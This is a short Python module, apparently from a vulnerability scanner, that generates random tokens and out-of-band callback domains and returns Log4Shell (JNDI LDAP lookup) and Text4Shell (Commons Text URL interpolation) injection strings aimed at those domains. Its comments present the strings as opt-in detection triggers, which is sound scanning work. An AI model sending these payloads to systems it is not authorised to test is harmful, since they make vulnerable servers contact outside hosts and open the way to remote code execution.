from __future__ import annotations

import secrets


def generate_token(*, nbytes: int = 10) -> str:
    return secrets.token_hex(nbytes)


def normalize_domain(domain: str) -> str:
    d = domain.strip().strip(".")
    if not d:
        raise ValueError("empty OAST domain")
    return d


def build_fqdn(token: str, domain: str) -> str:
    return f"{token}.{normalize_domain(domain)}"


def log4shell_payload(fqdn: str) -> str:
    # Recon-only: this is not an exploit by itself. It is a trigger string for
    # out-of-band detection when an operator explicitly opts in.
    return f"${{jndi:ldap://{fqdn}/a}}"


def text4shell_payload(fqdn: str) -> str:
    # Commons Text interpolation gadget. Only used when operator opts in.
    return f"${{url:http://{fqdn}/}}"
